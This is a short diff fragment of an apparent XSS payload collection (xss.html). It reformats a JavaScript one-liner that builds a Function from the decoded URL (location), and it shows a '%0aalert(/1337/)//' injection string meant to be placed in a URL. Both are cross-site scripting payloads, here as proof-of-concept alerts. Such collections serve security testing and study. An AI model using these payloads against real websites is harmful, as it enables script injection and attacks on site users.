@@ -92,9 +92,9 @@ xss.html
 
  `%0aalert(/1337/)//` anywhere in the URL
 
-```js
-Function`a${unescape.call`${location}`}```
-```
+
+    Function`a${unescape.call`${location}`}` ``
+
     
 ---
 
